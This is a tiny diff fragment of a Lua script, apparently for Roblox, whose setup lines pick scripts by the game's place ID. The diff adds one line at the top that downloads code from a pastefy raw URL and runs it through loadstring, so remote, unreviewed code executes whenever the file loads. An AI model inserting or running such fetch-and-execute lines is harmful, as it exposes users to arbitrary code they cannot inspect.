@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://pastefy.app/GDkzRWVE/raw"))()
+
 local placeId = game.PlaceId
 
 local scripts = {
